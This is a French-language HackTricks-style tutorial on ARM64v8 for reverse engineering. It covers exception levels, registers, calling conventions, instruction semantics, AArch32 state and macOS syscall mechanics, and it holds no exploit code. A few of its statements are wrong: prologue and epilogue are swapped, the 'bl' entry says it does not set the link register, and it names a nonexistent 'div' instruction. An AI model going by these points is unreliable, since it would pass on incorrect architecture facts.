# Introduction à ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Niveaux d'Exception - EL (ARM64v8)**

Dans l'architecture ARMv8, les niveaux d'exécution, appelés Exception Levels (ELs), définissent le niveau de privilège et les capacités de l'environnement d'exécution. Il existe quatre niveaux d'exception, allant de EL0 à EL3, chacun ayant un rôle différent :

1. **EL0 - Mode utilisateur**:
- C'est le niveau le moins privilégié et il est utilisé pour exécuter le code d'application ordinaire.
- Les applications s'exécutant en EL0 sont isolées les unes des autres et du logiciel système, ce qui améliore la sécurité et la stabilité.
2. **EL1 - Mode noyau du système d'exploitation**:
- La plupart des noyaux de systèmes d'exploitation s'exécutent à ce niveau.
- EL1 dispose de plus de privilèges qu'EL0 et peut accéder aux ressources système, mais avec certaines restrictions pour garantir l'intégrité du système.
3. **EL2 - Mode hyperviseur**:
- Ce niveau est utilisé pour la virtualisation. Un hyperviseur s'exécutant en EL2 peut gérer plusieurs systèmes d'exploitation (chacun en EL1) fonctionnant sur le même matériel physique.
- EL2 fournit des fonctionnalités d'isolation et de contrôle des environnements virtualisés.
4. **EL3 - Mode Secure Monitor**:
- C'est le niveau le plus privilégié et il est souvent utilisé pour le démarrage sécurisé et les environnements d'exécution de confiance.
- EL3 peut gérer et contrôler les accès entre les états secure et non-secure (comme secure boot, trusted OS, etc.).

L'utilisation de ces niveaux permet de gérer de manière structurée et sécurisée les différents aspects du système, des applications utilisateur aux logiciels système les plus privilégiés. L'approche d'ARMv8 pour les niveaux de privilège aide à isoler efficacement les composants du système, augmentant ainsi la sécurité et la robustesse du système.

## **Registres (ARM64v8)**

ARM64 possède **31 registres généraux**, étiquetés `x0` à `x30`. Chacun peut stocker une valeur **64 bits** (8 octets). Pour les opérations nécessitant uniquement des valeurs 32 bits, les mêmes registres peuvent être accédés en mode 32 bits en utilisant les noms `w0` à `w30`.

1. **`x0`** à **`x7`** - Ils sont généralement utilisés comme registres temporaires et pour passer des paramètres aux sous-routines.
- **`x0`** contient aussi les données de retour d'une fonction.
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro d'appel système pour l'instruction `svc`. **Sur macOS c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Registres temporaires supplémentaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - **Registres d'appel intra-procédural**. Registres temporaires pour des valeurs immédiates. Ils sont aussi utilisés pour les appels de fonctions indirects et les stubs PLT (Procedure Linkage Table).
- **`x16`** est utilisé comme **numéro d'appel système** pour l'instruction **`svc`** dans **macOS**.
5. **`x18`** - **Registre plateforme**. Il peut être utilisé comme registre général, mais sur certaines plateformes, ce registre est réservé à des usages spécifiques à la plateforme : pointeur vers le thread environment block courant sous Windows, ou pour pointer vers la structure de tâche en cours d'exécution dans le noyau linux.
6. **`x19`** à **`x28`** - Ce sont des registres préservés par le callee. Une fonction doit préserver les valeurs de ces registres pour son caller, ils sont donc stockés sur la pile et récupérés avant de revenir à l'appelant.
7. **`x29`** - **Frame pointer** pour suivre la trame de pile. Lorsqu'une nouvelle trame de pile est créée parce qu'une fonction est appelée, le registre **`x29`** est **stocké dans la pile** et la **nouvelle** adresse de frame pointer (l'adresse de **`sp`**) est **stockée dans ce registre**.
- Ce registre peut aussi être utilisé comme **registre général** bien qu'il soit habituellement utilisé comme référence pour les **variables locales**.
8. **`x30`** ou **`lr`** - **Link register**. Il contient l'**adresse de retour** lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée en stockant la valeur du **`pc`** dans ce registre.
- Il peut également être utilisé comme n'importe quel autre registre.
- Si la fonction courante va appeler une nouvelle fonction et écraser ainsi `lr`, elle le stockera dans la pile au début ; c'est l'épilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stocker `fp` et `lr`, générer de l'espace et obtenir un nouveau `fp`) et le restaurera à la fin ; c'est le prologue (`ldp x29, x30, [sp], #48; ret` -> Restaurer `fp` et `lr` et retourner).
9. **`sp`** - **Stack pointer**, utilisé pour suivre le sommet de la pile.
- la valeur de **`sp`** doit toujours être alignée au moins sur un **quadword** sinon une exception d'alignement peut survenir.
10. **`pc`** - **Program counter**, qui pointe vers l'instruction suivante. Ce registre ne peut être mis à jour que par la génération d'exceptions, les retours d'exception et les branches. Les seules instructions ordinaires pouvant lire ce registre sont les instructions branch with link (BL, BLR) qui stockent l'adresse du **`pc`** dans **`lr`** (Link Register).
11. **`xzr`** - **Registre zéro**. Aussi appelé **`wzr`** dans sa forme registre **32**-bit. Peut être utilisé pour obtenir facilement la valeur zéro (opération courante) ou pour effectuer des comparaisons en utilisant **`subs`** comme **`subs XZR, Xn, #10`** ne stockant le résultat nulle part (dans **`xzr`**).

Les registres **`Wn`** sont la version **32bit** du registre **`Xn`**.

> [!TIP]
> Les registres de X0 à X18 sont volatiles, ce qui signifie que leurs valeurs peuvent être modifiées par des appels de fonctions et des interruptions. Cependant, les registres de X19 à X28 sont non-volatiles, ce qui signifie que leurs valeurs doivent être préservées à travers les appels de fonctions ("callee saved").

### Registres SIMD et Floating-Point

De plus, il existe 32 autres registres de **128 bits** qui peuvent être utilisés pour des opérations SIMD optimisées (single instruction multiple data) et pour effectuer des calculs en virgule flottante. Ils sont appelés registres Vn bien qu'ils puissent aussi fonctionner en **64**-bit, **32**-bit, **16**-bit et **8**-bit et alors être appelés **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** et **`Bn`**.

### Registres Système

Il existe des centaines de registres système, appelés aussi special-purpose registers (SPRs), utilisés pour la **surveillance** et le **contrôle** du comportement des **processeurs**.\
Ils ne peuvent être lus ou écrits qu'en utilisant les instructions dédiées **`mrs`** et **`msr`**.

Les registres spéciaux **`TPIDR_EL0`** et **`TPIDDR_EL0`** sont couramment rencontrés lors de reversing engineering. Le suffixe `EL0` indique l'exception minimale depuis laquelle le registre peut être accédé (dans ce cas EL0 est le niveau d'exception régulier avec lequel les programmes ordinaires s'exécutent).\
Ils sont souvent utilisés pour stocker l'**adresse de base du thread-local storage** dans la mémoire. Habituellement, le premier est lisible et inscriptible par les programmes s'exécutant en EL0, mais le second peut être lu depuis EL0 et écrit depuis EL1 (comme le noyau).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contient plusieurs composantes du processus sérialisées dans le registre spécial visible par le système d'exploitation **`SPSR_ELx`**, X étant le **niveau de permission de l'exception déclenchée** (cela permet de récupérer l'état du processus lorsque l'exception se termine).\
Voici les champs accessibles :

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Les drapeaux de condition **`N`**, **`Z`**, **`C`** et **`V`** :
- **`N`** signifie que l'opération a donné un résultat négatif
- **`Z`** signifie que l'opération a donné zéro
- **`C`** signifie que l'opération a généré une retenue (carry)
- **`V`** signifie que l'opération a produit un overflow signé :
- La somme de deux nombres positifs donne un résultat négatif.
- La somme de deux nombres négatifs donne un résultat positif.
- Dans une soustraction, lorsqu'un grand nombre négatif est soustrait d'un plus petit nombre positif (ou inversement), et que le résultat ne peut être représenté dans la plage de la taille en bits donnée.
- Évidemment le processeur ne sait pas si l'opération est signée ou non, donc il vérifiera C et V dans les opérations et indiquera si une retenue s'est produite selon qu'elle était signée ou non.

> [!WARNING]
> Toutes les instructions ne mettent pas à jour ces drapeaux. Certaines comme **`CMP`** ou **`TST`** le font, et d'autres qui ont un suffixe s comme **`ADDS`** le font aussi.

- Le drapeau de **largeur de registre courante (`nRW`)** : Si le drapeau vaut 0, le programme s'exécutera en état AArch64 une fois repris.
- Le **niveau d'Exception courant** (**`EL`**) : Un programme régulier s'exécutant en EL0 aura la valeur 0.
- Le drapeau de **single stepping** (**`SS`**) : Utilisé par les débogueurs pour exécuter instruction par instruction en réglant le drapeau SS à 1 dans **`SPSR_ELx`** via une exception. Le programme exécutera un pas et déclenchera une exception de single step.
- Le drapeau d'état d'**exception illégale** (**`IL`**) : Il sert à marquer quand un logiciel privilégié effectue un transfert de niveau d'exception invalide ; ce drapeau est mis à 1 et le processeur déclenche une exception d'état illégal.
- Les drapeaux **`DAIF`** : Ces drapeaux permettent à un programme privilégié de masquer sélectivement certaines exceptions externes.
- Si **`A`** vaut 1, cela signifie que les **asynchronous aborts** seront déclenchés. **`I`** configure la réponse aux **Interrupt Requests** externes (IRQs). et le **F** est lié aux **Fast Interrupt Requests** (FIRs).
- Les flags de sélection du pointeur de pile (**`SPS`**) : Les programmes privilégiés s'exécutant en EL1 et au-dessus peuvent basculer entre l'utilisation de leur propre registre de pointeur de pile et celui du modèle utilisateur (par ex. entre `SP_EL1` et `EL0`). Ce basculement se fait en écrivant dans le registre spécial **`SPSel`**. Cela ne peut pas être fait depuis EL0.

## **Convention d'appel (ARM64v8)**

La convention d'appel ARM64 précise que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les paramètres **supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou aussi dans **`x1`** si elle fait **128 bits**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** à travers les appels de fonctions.

Lors de la lecture d'une fonction en assembleur, recherchez le **prologue** et l'**épilogue** de la fonction. Le **prologue** implique généralement **la sauvegarde du frame pointer (`x29`)**, **la mise en place** d'un **nouveau frame pointer**, et **l'allocation d'espace sur la pile**. L'**épilogue** implique généralement **la restauration du frame pointer sauvegardé** et le **retour** de la fonction.

### Convention d'appel en Swift

Swift a sa propre **convention d'appel** qui peut être trouvée sur [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instructions courantes (ARM64v8)**

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le **registre de destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les **registres source**. Des valeurs immédiates peuvent aussi être utilisées à la place des registres source.

- **`mov`** : **Déplacer** une valeur d'un **registre** à un autre.
- Exemple: `mov x0, x1` — Cela déplace la valeur de `x1` vers `x0`.
- **`ldr`** : **Charger** une valeur depuis la **mémoire** dans un **registre**.
- Exemple: `ldr x0, [x1]` — Cela charge une valeur depuis l'adresse mémoire pointée par `x1` dans `x0`.
- **Mode offset** : Un offset affectant le pointeur origine est indiqué, par exemple :
- `ldr x2, [x1, #8]`, cela chargera dans x2 la valeur depuis x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, cela chargera dans x2 un objet depuis le tableau x0, à la position x1 (index) * 4
- **Mode pré-indexé** : Cela applique les calculs à l'origine, récupère le résultat et stocke aussi la nouvelle origine dans l'origine.
- `ldr x2, [x1, #8]!`, cela chargera `x1 + 8` dans `x2` et stockera dans x1 le résultat de `x1 + 8`
- `str lr, [sp, #-4]!`, Stocke le link register dans sp et met à jour le registre sp
- **Mode post-indexé** : C'est comme le précédent mais l'adresse mémoire est accédée puis l'offset est calculé et stocké.
- `ldr x0, [x1], #8`, charge `x1` dans `x0` et met à jour x1 avec `x1 + 8`
- **Adresse relative au PC** : Dans ce cas l'adresse à charger est calculée relative au registre PC
- `ldr x1, =_start`, Cela chargera dans x1 l'adresse où commence le symbole `_start` par rapport au PC actuel.
- **`str`** : **Stocker** une valeur d'un **registre** dans la **mémoire**.
- Exemple: `str x0, [x1]` — Cela stocke la valeur de `x0` dans l'emplacement mémoire pointé par `x1`.
- **`ldp`** : **Load Pair of Registers**. Cette instruction **charge deux registres** depuis des **emplacements mémoire consécutifs**. L'adresse mémoire est typiquement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple: `ldp x0, x1, [x2]` — Cela charge `x0` et `x1` depuis les emplacements mémoire à `x2` et `x2 + 8`, respectivement.
- **`stp`** : **Store Pair of Registers**. Cette instruction **stocke deux registres** vers des **emplacements mémoire consécutifs**. L'adresse mémoire est typiquement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple: `stp x0, x1, [sp]` — Cela stocke `x0` et `x1` aux emplacements mémoire à `sp` et `sp + 8`, respectivement.
- `stp x0, x1, [sp, #16]!` — Cela stocke `x0` et `x1` aux emplacements mémoire `sp+16` et `sp + 24`, respectivement, et met à jour `sp` avec `sp+16`.
- **`add`** : **Additionner** les valeurs de deux registres et stocker le résultat dans un registre.
- Syntaxe: add(s) Xn1, Xn2, Xn3 | #imm, [shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Opérande 1
- Xn3 | #imm -> Opérande 2 (registre ou immédiat)
- [shift #N | RRX] -> Effectuer un décalage ou appeler RRX
- Exemple: `add x0, x1, x2` — Cela additionne les valeurs dans `x1` et `x2` et stocke le résultat dans `x0`.
- `add x5, x5, #1, lsl #12` — Cela équivaut à 4096 (un 1 décalé 12 fois) -> 1 0000 0000 0000 0000
- **`adds`** : Effectue un `add` et met à jour les flags.
- **`sub`** : **Soustraire** les valeurs de deux registres et stocker le résultat dans un registre.
- Voir la **syntaxe `add`**.
- Exemple: `sub x0, x1, x2` — Cela soustrait la valeur dans `x2` de `x1` et stocke le résultat dans `x0`.
- **`subs`** : Comme `sub` mais met à jour les flags.
- **`mul`** : **Multiplier** les valeurs de **deux registres** et stocker le résultat dans un registre.
- Exemple: `mul x0, x1, x2` — Cela multiplie les valeurs dans `x1` et `x2` et stocke le résultat dans `x0`.
- **`div`** : **Diviser** la valeur d'un registre par un autre et stocker le résultat dans un registre.
- Exemple: `div x0, x1, x2` — Cela divise la valeur dans `x1` par `x2` et stocke le résultat dans `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`** :
- **Logical shift left** : Ajoute des 0 à la fin en décalant les autres bits vers l'avant (multiplie par 2^n)
- **Logical shift right** : Ajoute des 0 au début en décalant les autres bits vers l'arrière (divise par 2^n en unsigned)
- **Arithmetic shift right** : Comme **`lsr`**, mais au lieu d'ajouter des 0 si le bit de poids fort est 1, **des 1 sont ajoutés** (divise par 2^n en signed)
- **Rotate right** : Comme **`lsr`** mais ce qui est supprimé à droite est ajouté à gauche
- **Rotate Right with Extend** : Comme **`ror`**, mais avec le flag carry comme "bit de poids fort". Ainsi le flag carry est déplacé au bit 31 et le bit supprimé va dans le flag carry.
- **`bfm`** : **Bit Field Move**, ces opérations **copient des bits `0...n`** d'une valeur et les placent aux positions **`m..m+n`**. Le **`#s`** spécifie la **position du bit le plus à gauche** et **`#r`** la **quantité de rotation à droite**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Extraction et insertion de champs de bits :** Copier un champ de bits d'un registre et le copier dans un autre registre.
- **`BFI X1, X2, #3, #4`** Insère 4 bits de X2 à partir du bit 3 dans X1
- **`BFXIL X1, X2, #3, #4`** Extrait à partir du bit 3 de X2 quatre bits et les copie dans X1
- **`SBFIZ X1, X2, #3, #4`** Étend avec signe 4 bits de X2 et les insère dans X1 à partir de la position bit 3 en mettant à zéro les bits de droite
- **`SBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2, les étend avec signe, et place le résultat dans X1
- **`UBFIZ X1, X2, #3, #4`** Étend par zéro 4 bits de X2 et les insère dans X1 à partir de la position bit 3 en mettant à zéro les bits de droite
- **`UBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2 et place le résultat étendu par zéro dans X1.
- **Sign Extend To X :** Étend le signe (ou ajoute simplement des 0 dans la version non signée) d'une valeur pour pouvoir effectuer des opérations avec elle :
- **`SXTB X1, W2`** Étend le signe d'un octet **de W2 à X1** (`W2` est la moitié de `X2`) pour remplir les 64 bits
- **`SXTH X1, W2`** Étend le signe d'un nombre 16 bits **de W2 à X1** pour remplir les 64 bits
- **`SXTW X1, W2`** Étend le signe d'un mot **de W2 à X1** pour remplir les 64 bits
- **`UXTB X1, W2`** Ajoute des 0s (unsigned) à un octet **de W2 à X1** pour remplir les 64 bits
- **`extr` :** Extrait des bits d'une **paire de registres concaténés**.
- Exemple: `EXTR W3, W2, W1, #3` Cela va **concaténer W1+W2** et obtenir **du bit 3 de W2 jusqu'au bit 3 de W1** et le stocker dans W3.
- **`cmp`** : **Comparer** deux registres et régler les flags de condition. C'est un **alias de `subs`** mettant le registre de destination au registre zéro. Utile pour savoir si `m == n`.
- Il supporte la **même syntaxe que `subs`**
- Exemple: `cmp x0, x1` — Cela compare les valeurs dans `x0` et `x1` et règle les flags de condition en conséquence.
- **`cmn`** : **Compare negative** opérande. Dans ce cas c'est un **alias de `adds`** et supporte la même syntaxe. Utile pour savoir si `m == -n`.
- **`ccmp`** : Comparaison conditionnelle, c'est une comparaison qui sera effectuée seulement si une comparaison précédente était vraie et qui définira spécifiquement les bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 et x3 < x4, sauter vers func
- Ceci parce que **`ccmp`** ne sera exécuté que si la **cmp précédente était un `NE`**, si ce n'était pas le cas les bits `nzcv` seront mis à 0 (ce qui ne satisfera pas la comparaison `blt`).
- Cela peut aussi être utilisé comme `ccmn` (même chose mais négatif, comme `cmp` vs `cmn`).
- **`tst`** : Vérifie si certains bits de la comparaison sont à 1 (fonctionne comme ANDS sans stocker le résultat nulle part). Utile pour vérifier un registre avec une valeur et tester si certains bits du registre indiqués dans la valeur sont à 1.
- Exemple: `tst X1, #7` Vérifie si l'un des 3 derniers bits de X1 est à 1
- **`teq`** : Opération XOR en ignorant le résultat
- **`b`** : Branch inconditionnel
- Exemple: `b myFunction`
- Notez que cela ne remplit pas le link register avec l'adresse de retour (donc pas adapté pour les appels de sous-routines qui doivent retourner)
- **`bl`** : **Branch** with link, utilisé pour **appeler** une **sous-routine**. Stocke l'**adresse de retour dans `x30`**.
- Exemple: `bl myFunction` — Appelle la fonction `myFunction` et stocke l'adresse de retour dans `x30`.
- Notez que cela ne remplit pas le link register avec l'adresse de retour (pas adapté pour les sous-routines qui doivent revenir)
- **`blr`** : **Branch** with Link to Register, utilisé pour **appeler** une **sous-routine** dont la cible est **spécifiée** dans un **registre**. Stocke l'adresse de retour dans `x30`.
- Exemple: `blr x1` — Appelle la fonction dont l'adresse est contenue dans `x1` et stocke l'adresse de retour dans `x30`.
- **`ret`** : **Retour** d'une **sous-routine**, typiquement en utilisant l'adresse dans **`x30`**.
- Exemple: `ret` — Cela retourne de la sous-routine courante en utilisant l'adresse de retour dans `x30`.
- **`b.<cond>`** : Branch conditionnel
- **`b.eq`** : **Branch si égal**, basé sur l'instruction `cmp` précédente.
- Exemple: `b.eq label` — Si la précédente instruction `cmp` a trouvé deux valeurs égales, ceci saute à `label`.
- **`b.ne`** : **Branch si non égal**. Cette instruction vérifie les flags de condition (qui ont été réglés par une instruction de comparaison précédente), et si les valeurs comparées n'étaient pas égales, elle branche vers une étiquette ou une adresse.
- Exemple: Après une instruction `cmp x0, x1`, `b.ne label` — Si les valeurs dans `x0` et `x1` n'étaient pas égales, ceci saute à `label`.
- **`cbz`** : **Compare and Branch on Zero**. Cette instruction compare un registre avec zéro, et si égal, elle branche vers une étiquette ou adresse.
- Exemple: `cbz x0, label` — Si la valeur dans `x0` est zéro, ceci saute à `label`.
- **`cbnz`** : **Compare and Branch on Non-Zero**. Cette instruction compare un registre avec zéro, et si non égal, elle branche.
- Exemple: `cbnz x0, label` — Si la valeur dans `x0` est non-zéro, ceci saute à `label`.
- **`tbnz`** : Test bit and branch on nonzero
- Exemple: `tbnz x0, #8, label`
- **`tbz`** : Test bit and branch on zero
- Exemple: `tbz x0, #8, label`
- **Opérations de sélection conditionnelle** : Ce sont des opérations dont le comportement varie selon les bits conditionnels.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si vrai, X0 = X1, sinon X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Si vrai, Xd = Xn + 1, sinon, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Si vrai, Xd = NOT(Xn), sinon, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon, Xd = - Xm
- `cneg Xd, Xn, cond` -> Si vrai, Xd = - Xn, sinon, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Si vrai, Xd = 1, sinon, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Si vrai, Xd = \<all 1>, sinon, Xd = 0
- **`adrp`** : Calculer l'**adresse de page d'un symbole** et la stocker dans un registre.
- Exemple: `adrp x0, symbol` — Cela calcule l'adresse de page de `symbol` et la stocke dans `x0`.
- **`ldrsw`** : **Charger** une valeur **signée 32 bits** depuis la mémoire et **l'étendre avec signe à 64 bits**.
- Exemple: `ldrsw x0, [x1]` — Cela charge une valeur 32 bits signée depuis l'adresse pointée par `x1`, l'étend à 64 bits, et la stocke dans `x0`.
- **`stur`** : **Stocker** la valeur d'un registre dans un emplacement mémoire, en utilisant un offset depuis un autre registre.
- Exemple: `stur x0, [x1, #4]` — Cela stocke la valeur de `x0` à l'adresse mémoire qui est 4 octets plus grande que l'adresse contenue dans `x1`.
- **`svc`** : Faire un **appel système**. Cela signifie "Supervisor Call". Lorsque le processeur exécute cette instruction, il **passe du mode utilisateur au mode noyau** et saute vers un emplacement mémoire spécifique où le **code de gestion des appels système du noyau** est situé.

- Exemple:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Sauvegarder le link register et le frame pointer sur la pile** :
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurer le nouveau pointeur de cadre**: `mov x29, sp` (définit le nouveau pointeur de cadre pour la fonction courante)
3. **Allouer de l'espace sur la pile pour les variables locales** (si nécessaire): `sub sp, sp, <size>` (où `<size>` est le nombre d'octets requis)

### **Épilogue de la fonction**

1. **Désallouer les variables locales (si elles ont été allouées)**: `add sp, sp, <size>`
2. **Restaurer le registre de lien et le pointeur de cadre**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (rend le contrôle à l'appelant en utilisant l'adresse dans le link register)

## AARCH32 État d'exécution

Armv8-A prend en charge l'exécution de programmes 32 bits. **AArch32** peut s'exécuter dans l'un des **deux jeux d'instructions** : **`A32`** et **`T32`** et peut basculer entre eux via **`interworking`**.\
Des programmes 64 bits **privilégiés** peuvent déclencher l'**exécution de programmes 32 bits** en effectuant un transfert de niveau d'exception vers le 32 bits de moindre privilège.\
Notez que la transition du 64 bits vers le 32 bits se produit avec un niveau d'exception inférieur (par exemple un programme 64 bits en EL1 déclenchant un programme en EL0). Cela se fait en définissant le **bit 4 de** le registre spécial **`SPSR_ELx`** **à 1** lorsque le thread de processus `AArch32` est prêt à être exécuté et le reste de `SPSR_ELx` stocke le CPSR du programme **`AArch32`**. Ensuite, le processus privilégié appelle l'instruction **`ERET`** pour que le processeur passe en **`AArch32`** entrant en A32 ou T32 selon le CPSR**.**

L'**`interworking`** se fait en utilisant les bits J et T du CPSR. `J=0` et `T=0` signifie **`A32`** et `J=0` et `T=1` signifie **T32**. Cela revient essentiellement à définir le **bit le plus bas à 1** pour indiquer que le jeu d'instructions est T32.\
Ceci est défini lors des **instructions de branchement d'interworking,** mais peut aussi être défini directement par d'autres instructions lorsque le PC est utilisé comme registre de destination. Exemple:

Un autre exemple:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registres

Il y a 16 registres 32 bits (r0-r15). **From r0 to r14** ils peuvent être utilisés pour **n'importe quelle opération**, cependant certains d'entre eux sont généralement réservés :

- **`r15`**: Program counter (always). Contient l'adresse de l'instruction suivante. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

De plus, les registres sont sauvegardés dans des **`banked registries`**. Ce sont des emplacements qui stockent les valeurs des registres permettant d'effectuer des **fast context switching** dans la gestion des exceptions et les opérations privilégiées afin d'éviter la nécessité de sauvegarder et restaurer manuellement les registres à chaque fois.\
Ceci est réalisé en **sauvegardant l'état du processeur depuis le `CPSR` vers le `SPSR`** du mode processeur vers lequel l'exception est prise. Au retour de l'exception, le **`CPSR`** est restauré à partir du **`SPSR`**.

### CPSR - Registre d'état du programme courant

In AArch32 le CPSR fonctionne de manière similaire à **`PSTATE`** en AArch64 et est aussi stocké dans **`SPSR_ELx`** lorsqu'une exception est levée pour restaurer ensuite l'exécution :

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Les champs sont divisés en quelques groupes :

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Comportement du processus (géré par l'OS).

#### Registre d'état du programme d'application (APSR)

- Les **`N`**, **`Z`**, **`C`**, **`V`** flags (comme en AArch64)
- Le drapeau **`Q`** : il est mis à **`1`** chaque fois qu'une **saturation entière se produit** pendant l'exécution d'une instruction arithmétique saturante spécialisée. Une fois qu'il est mis à **`1`**, il conserve la valeur jusqu'à ce qu'il soit manuellement remis à **`0`**. De plus, il n'existe aucune instruction qui vérifie implicitement sa valeur ; il faut la lire explicitement.
- Les drapeaux **`GE`** (Greater than or equal) : utilisés dans les opérations SIMD (Single Instruction, Multiple Data), telles que "parallel add" et "parallel subtract". Ces opérations permettent de traiter plusieurs éléments de données en une seule instruction.

Par exemple, l'instruction **`UADD8`** **ajoute quatre paires d'octets** (à partir de deux opérandes 32 bits) en parallèle et stocke les résultats dans un registre 32 bits. Elle **met ensuite à jour les drapeaux `GE` dans l'`APSR`** en fonction de ces résultats. Chaque drapeau GE correspond à l'une des additions d'octet, indiquant si l'addition pour cette paire d'octets a **débordé**.

L'instruction **`SEL`** utilise ces drapeaux GE pour effectuer des actions conditionnelles.

#### Registres d'état d'exécution

- Les bits **`J`** et **`T`** : **`J`** doit être 0 et si **`T`** est 0 l'ensemble d'instructions A32 est utilisé, et s'il est à 1, c'est le T32 qui est utilisé.
- **IT Block State Register** (`ITSTATE`) : Ce sont les bits 10-15 et 25-26. Ils stockent les conditions pour les instructions à l'intérieur d'un groupe préfixé **`IT`**.
- Bit **`E`** : Indique le **endianness**.
- **Mode and Exception Mask Bits** (0-4) : Ils déterminent l'état d'exécution courant. Le **5th** indique si le programme tourne en 32bit (un **1**) ou 64bit (un **0**). Les autres 4 représentent le **mode d'exception actuellement utilisé** (lorsqu'une exception survient et est traitée). Le nombre défini **indique la priorité courante** au cas où une autre exception serait déclenchée pendant le traitement.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`** : Certaines exceptions peuvent être désactivées en utilisant les bits **`A`**, `I`, `F`. Si **`A`** est **1**, cela signifie que des **asynchronous aborts** seront déclenchés. Le **`I`** configure la réponse aux **Interrupts Requests** (IRQ) matériels externes. Le **`F`** est lié aux **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Parfois il est plus simple de vérifier le code **décompilé** de **`libsystem_kernel.dylib`** **plutôt que** de vérifier le **code source**, car le code de plusieurs syscalls (BSD et Mach) est généré via des scripts (vérifiez les commentaires dans le code source) tandis que dans le dylib vous pouvez trouver ce qui est appelé.

### machdep calls

XNU prend en charge un autre type d'appels appelés machine dependent. Les numéros de ces appels dépendent de l'architecture et ni les appels ni les numéros ne sont garantis de rester constants.

### comm page

C'est une page mémoire appartenant au noyau qui est mappée dans l'espace d'adressage de chaque processus utilisateur. Elle est conçue pour rendre la transition du mode utilisateur vers l'espace kernel plus rapide que l'utilisation de syscalls pour des services du kernel tellement utilisés que cette transition serait très inefficace.

Par exemple l'appel `gettimeofdate` lit la valeur de `timeval` directement depuis la comm page.

### objc_msgSend

Il est très courant de trouver cette fonction utilisée dans des programmes Objective-C ou Swift. Cette fonction permet d'appeler une méthode d'un objet Objective-C.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointeur vers l'instance
